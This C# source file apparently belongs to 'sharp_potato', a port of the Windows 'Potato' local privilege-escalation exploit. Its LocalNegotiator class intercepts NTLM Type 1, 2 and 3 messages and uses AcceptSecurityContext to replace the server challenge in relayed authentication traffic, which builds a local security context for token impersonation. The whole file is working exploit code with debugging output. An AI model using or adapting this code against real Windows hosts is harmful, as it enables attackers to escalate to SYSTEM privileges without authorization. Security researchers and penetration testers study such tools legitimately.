using System.Runtime.InteropServices;
using sharp_potato.Secur32;
using static sharp_potato.Secur32.Native;

namespace sharp_potato;

public unsafe class LocalNegotiator
{
    public int AuthResult { get; set; } = -1;
    public Vanara.PInvoke.Secur32.CtxtHandle Context => context;

    private SecBufferDesc secClientBufferDesc;
    private SecBufferDesc secServerBufferDesc;
    private SecBuffer secClientBuffer;
    private SecBuffer secServerBuffer;
    private Vanara.PInvoke.Secur32.CtxtHandle context;

    private static void InitTokenContextBuffer(out SecBufferDesc secBufferDesc, out SecBuffer secBuffer)
    {
        secBuffer = new SecBuffer(Array.Empty<byte>(), SecBufferType.SECBUFFER_TOKEN);
        secBufferDesc = new SecBufferDesc(secBuffer);
    }

    public int HandleType1(byte* data, int length)
    {
        var result = AcquireCredentialsHandle(null, "Negotiate", SECPKG_CRED_INBOUND, IntPtr.Zero,
            IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, out var credential, out var expiry);

        if (result != SEC_E_OK)
        {
            Console.Out.WriteLine("Error in AquireCredentialsHandle");
            return -1;
        }

        //InitTokenContextBuffer(out secClientBufferDesc, out secClientBuffer);
        //InitTokenContextBuffer(out secServerBufferDesc, out secServerBuffer);

        var tempData = new byte[length];
        Marshal.Copy((IntPtr) data, tempData, 0, length);

        secClientBuffer = new SecBuffer(tempData, SecBufferType.SECBUFFER_TOKEN);
        secClientBufferDesc = new SecBufferDesc(secClientBuffer);

        secServerBuffer = new SecBuffer {BufferType = (uint) SecBufferType.SECBUFFER_TOKEN};
        secServerBufferDesc = new SecBufferDesc(secServerBuffer);

        context = new Vanara.PInvoke.Secur32.CtxtHandle();

        Console.WriteLine($"  >> [PRE/C] secServerBuffer.pvBuffer[{secClientBuffer.cbBuffer}] == nullptr: {(secClientBuffer.pvBuffer == IntPtr.Zero ? "YES" : "NO")}");
        Console.WriteLine($"  >> [PRE] secServerBuffer.pvBuffer[{secServerBuffer.cbBuffer}] == nullptr: {(secServerBuffer.pvBuffer == IntPtr.Zero ? "YES" : "NO")}");

        result = AcceptSecurityContext(ref credential, IntPtr.Zero, ref secClientBufferDesc, ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
            SECURITY_NATIVE_DREP, ref context, ref secServerBufferDesc, out _, out _);

        secServerBuffer = new SecBuffer(secServerBufferDesc.GetBufferBytes(0), SecBufferType.SECBUFFER_TOKEN);
        secServerBufferDesc = new SecBufferDesc(secClientBuffer);

        Console.WriteLine(
            $"  >> [POST] secServerBuffer.pvBuffer[{secServerBuffer.cbBuffer}/{secServerBufferDesc.GetBufferBytes(0).Length}] == nullptr: {(secServerBuffer.pvBuffer == IntPtr.Zero ? "YES" : "NO")}");

        Console.Out.WriteLine($"  >> [ret] 0x{result:X8}");
        return (int) result;
    }

    public int HandleType2(byte* data, int length)
    {
        var newNtlmBytes = new byte[secServerBuffer.cbBuffer];

        if (secServerBuffer.pvBuffer != IntPtr.Zero && secServerBuffer.cbBuffer != 0)
            Marshal.Copy(secServerBuffer.pvBuffer, newNtlmBytes, 0, (int) secServerBuffer.cbBuffer);

        Console.WriteLine($"  >> secServerBuffer.pvBuffer[{secServerBuffer.cbBuffer}] == nullptr: {(secServerBuffer.pvBuffer == IntPtr.Zero ? "YES" : "NO")}");
        if (length >= secServerBuffer.cbBuffer)
        {
            for (int i = 0; i < length; i++)
            {
                if (i < secServerBuffer.cbBuffer)
                    data[i] = newNtlmBytes[i];
                else
                    data[i] = 0x00;
            }
        }
        else
        {
            Console.WriteLine("Buffer sizes incompatible - can't replace");
        }

        return 0;
    }

    public int HandleType3(byte* data, int length)
    {
        var tempData = new byte[length];
        Marshal.Copy((IntPtr) data, tempData, 0, length);
        Console.Out.WriteLine($" > {string.Join("", tempData.Select(a => $"{a:X2}"))} < ");

        secClientBuffer = new SecBuffer(tempData, SecBufferType.SECBUFFER_TOKEN);
        secClientBufferDesc = new SecBufferDesc(secClientBuffer);

        secServerBuffer = new SecBuffer {BufferType = (uint) SecBufferType.SECBUFFER_TOKEN};
        secServerBufferDesc = new SecBufferDesc(secServerBuffer);

        Console.WriteLine($"  >> [PRE] secServerBuffer.pvBuffer[{secServerBuffer.cbBuffer}] == nullptr: {(secServerBuffer.pvBuffer == IntPtr.Zero ? "YES" : "NO")}");
        AuthResult = (int) AcceptSecurityContext(ref context, ref context, ref secClientBufferDesc, ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,
            SECURITY_NATIVE_DREP, ref context, ref secServerBufferDesc, out _, out _);
        Console.WriteLine($"  >> [POST] secServerBuffer.pvBuffer[{secServerBuffer.cbBuffer}] == nullptr: {(secServerBuffer.pvBuffer == IntPtr.Zero ? "YES" : "NO")}");

        Console.Out.WriteLine("AuthResult: " + AuthResult);

        return AuthResult;
    }
}